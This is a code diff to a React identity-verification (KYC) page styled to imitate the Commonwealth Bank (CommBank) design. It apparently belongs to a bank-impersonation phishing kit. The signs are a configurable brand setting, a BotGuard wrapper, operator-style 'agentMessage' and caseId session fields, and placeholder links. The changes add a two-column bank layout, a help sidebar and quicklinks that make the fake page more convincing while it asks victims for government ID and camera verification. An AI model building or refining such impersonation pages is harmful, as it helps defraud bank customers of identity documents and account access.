@@ -2,7 +2,7 @@
 
 /**
  * CBA KYC (Know Your Customer) Page
- * Centered single-column layout matching CommBank design
+ * Two-column layout matching CommBank design patterns
  * Includes popup blocker detection with manual link fallback
  */
 
@@ -10,7 +10,17 @@ import { useState, useEffect } from 'react';
 import { useSessionStore } from '@shared';
 import { currentBrand } from '@/config/branding';
 import { BotGuard } from '@/components/security/BotGuard';
-import { Loader2, ExternalLink, AlertCircle } from 'lucide-react';
+import { VerificationSidebar } from '@/components/layout/Sidebar';
+import { Loader2, ExternalLink } from 'lucide-react';
+
+// Arrow Icon SVG component
+function ArrowIcon() {
+  return (
+    <svg className="arrow-icon" width="8" height="10" viewBox="0 0 8 10" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <polygon points="0,0 8,5 0,10" fill="#FFCC00" />
+    </svg>
+  );
+}
 
 export default function KYCPage() {
   const { status, caseId, agentMessage } = useSessionStore();
@@ -75,13 +85,6 @@ export default function KYCPage() {
     }
   }
 
-  // Manual open for when popup is blocked
-  function handleManualOpen() {
-    if (kycUrl) {
-      window.open(kycUrl, '_blank');
-    }
-  }
-
   async function handleKYCCompleted() {
     if (!caseId) {
       setError('Session information missing');
@@ -126,123 +129,142 @@ export default function KYCPage() {
   return (
     <BotGuard>
       <div className="main-container">
-        <div className="case-id-box" style={{ maxWidth: '500px' }}>
-          <div className="box-header">
-            <span>Identity Verification</span>
+        {/* Two Column Layout */}
+        <section className="login-section">
+          {/* Left Column - KYC Form */}
+          <div className="login-box">
+            <div className="box-header">
+              <span>Identity Verification</span>
+            </div>
+            <div className="box-content">
+              {/* Waiting State */}
+              {isWaiting ? (
+                <div style={{ textAlign: 'center', padding: '20px 0' }}>
+                  <Loader2 className="h-8 w-8 animate-spin" style={{ margin: '0 auto 16px', color: '#7A7A7A' }} />
+                  <p className="form-description" style={{ marginBottom: 0 }}>
+                    Please wait while we verify your identity.
+                  </p>
+                </div>
+              ) : (
+                <>
+                  {kycStatus === 'not_started' && (
+                    <>
+                      <p className="form-description">
+                        To protect your account, we need to verify your identity. This process takes approximately 2-3 minutes.
+                      </p>
+
+                      <div style={{ marginBottom: '20px' }}>
+                        <strong style={{ fontSize: '13px', display: 'block', marginBottom: '8px' }}>Please have ready:</strong>
+                        <ul className="kyc-checklist">
+                          <li>A valid government-issued ID (passport, driver's licence)</li>
+                          <li>A device with a camera for photo verification</li>
+                        </ul>
+                      </div>
+
+                      {/* Error message - inline style */}
+                      {error && (
+                        <div className="error-message" style={{ marginBottom: '15px' }}>
+                          <span>{error}</span>
+                        </div>
+                      )}
+
+                      <div className="form-row button-row" style={{ paddingLeft: 0 }}>
+                        <button
+                          type="button"
+                          onClick={handleBeginKYC}
+                          className="logon-button"
+                        >
+                          Begin Verification
+                          <ExternalLink className="h-4 w-4" style={{ marginLeft: '6px' }} />
+                        </button>
+                      </div>
+
+                      <p className="form-note" style={{ paddingLeft: 0, marginTop: '15px', textAlign: 'left' }}>
+                        Opens in a new window
+                      </p>
+                    </>
+                  )}
+
+                  {kycStatus === 'in_progress' && (
+                    <>
+                      {/* Popup blocked fallback */}
+                      {popupBlocked && kycUrl && (
+                        <div className="popup-blocked-notice">
+                          <p className="form-description" style={{ marginBottom: '12px' }}>
+                            <strong>Pop-up blocked?</strong> Click the link below:
+                          </p>
+                          <a
+                            href={kycUrl}
+                            target="_blank"
+                            rel="noopener noreferrer"
+                            className="popup-fallback-link"
+                            onClick={() => setPopupBlocked(false)}
+                          >
+                            Open Verification Page
+                            <ExternalLink className="h-4 w-4" style={{ marginLeft: '6px' }} />
+                          </a>
+                        </div>
+                      )}
+
+                      <p className="form-description" style={{ marginTop: popupBlocked ? '16px' : '0' }}>
+                        Complete the verification in the new window, then click Continue below.
+                      </p>
+
+                      {/* Error message - inline style */}
+                      {error && (
+                        <div className="error-message" style={{ marginBottom: '15px' }}>
+                          <span>{error}</span>
+                        </div>
+                      )}
+
+                      <div className="form-row button-row" style={{ paddingLeft: 0 }}>
+                        <button
+                          type="button"
+                          onClick={handleKYCCompleted}
+                          className="logon-button"
+                          disabled={isLoading}
+                        >
+                          {isLoading && <Loader2 className="h-4 w-4 animate-spin" />}
+                          {isLoading ? 'Submitting...' : 'Continue'}
+                        </button>
+                      </div>
+
+                      <div className="form-footer" style={{ paddingLeft: 0, marginTop: '15px' }}>
+                        <button
+                          type="button"
+                          onClick={handleRetry}
+                          disabled={isLoading}
+                          className="form-link-button"
+                          style={{ padding: 0 }}
+                        >
+                          Start over
+                        </button>
+                      </div>
+                    </>
+                  )}
+                </>
+              )}
+            </div>
           </div>
 
-          <form className="case-id-form" onSubmit={(e) => e.preventDefault()}>
-            {/* Waiting State */}
-            {isWaiting ? (
-              <>
-                <p className="form-description" style={{ textAlign: 'center' }}>
-                  Please wait while we verify your identity.
-                </p>
-                <button className="logon-button" disabled style={{ alignSelf: 'center' }}>
-                  <Loader2 className="h-4 w-4 animate-spin" />
-                  Verifying...
-                </button>
-              </>
-            ) : (
-              <>
-                {kycStatus === 'not_started' && (
-                  <>
-                    <p className="form-description">
-                      To protect your account, we need to verify your identity.
-                    </p>
+          {/* Right Column - Help Sidebar */}
+          <VerificationSidebar />
+        </section>
 
-                    <div style={{ marginBottom: '15px' }}>
-                      <strong style={{ fontSize: '13px' }}>Have ready:</strong>
-                      <ul className="kyc-checklist">
-                        <li>A valid government-issued ID</li>
-                        <li>A device with a camera</li>
-                      </ul>
-                    </div>
-
-                    {error && (
-                      <div className="error-message">
-                        <AlertCircle className="h-4 w-4" />
-                        <span>{error}</span>
-                      </div>
-                    )}
-
-                    <button
-                      type="button"
-                      onClick={handleBeginKYC}
-                      className="logon-button"
-                      style={{ alignSelf: 'center' }}
-                    >
-                      Begin Verification
-                      <ExternalLink className="h-4 w-4" style={{ marginLeft: '8px' }} />
-                    </button>
-
-                    <p className="form-note">
-                      Opens in a new window
-                    </p>
-                  </>
-                )}
-
-                {kycStatus === 'in_progress' && (
-                  <>
-                    {/* Popup blocked fallback */}
-                    {popupBlocked && kycUrl && (
-                      <div className="popup-blocked-notice">
-                        <p className="form-description" style={{ marginBottom: '12px' }}>
-                          <strong>Pop-up blocked?</strong> Click the link below to open the verification page:
-                        </p>
-                        <a
-                          href={kycUrl}
-                          target="_blank"
-                          rel="noopener noreferrer"
-                          className="popup-fallback-link"
-                          onClick={() => setPopupBlocked(false)}
-                        >
-                          Open Verification Page
-                          <ExternalLink className="h-4 w-4" style={{ marginLeft: '6px' }} />
-                        </a>
-                      </div>
-                    )}
-
-                    <p className="form-description" style={{ marginTop: popupBlocked ? '16px' : '0' }}>
-                      Complete the verification in the new window, then click Continue.
-                    </p>
-
-                    {error && (
-                      <div className="error-message">
-                        <AlertCircle className="h-4 w-4" />
-                        <span>{error}</span>
-                      </div>
-                    )}
-
-                    <button
-                      type="button"
-                      onClick={handleKYCCompleted}
-                      className="logon-button"
-                      disabled={isLoading}
-                      style={{ alignSelf: 'center' }}
-                    >
-                      {isLoading && <Loader2 className="h-4 w-4 animate-spin" />}
-                      {isLoading ? 'Submitting...' : 'Continue'}
-                    </button>
-
-                    <button
-                      type="button"
-                      onClick={handleRetry}
-                      disabled={isLoading}
-                      className="form-link-button"
-                    >
-                      Start over
-                    </button>
-                  </>
-                )}
-              </>
-            )}
-
-            <p className="form-note" style={{ marginTop: '20px' }}>
-              Need help? Contact {currentBrand.companyName} support
-            </p>
-          </form>
-        </div>
+        {/* Quicklinks Section */}
+        <section className="quicklinks-section">
+          <h3 className="quicklinks-title">Quicklinks</h3>
+          <ul className="quicklinks-list">
+            <li>
+              <ArrowIcon />
+              <a href="#">Are you experiencing financial difficulty? Get help</a>
+            </li>
+            <li>
+              <ArrowIcon />
+              <a href="#">Report suspicious activity or scams</a>
+            </li>
+          </ul>
+        </section>
       </div>
     </BotGuard>
   );
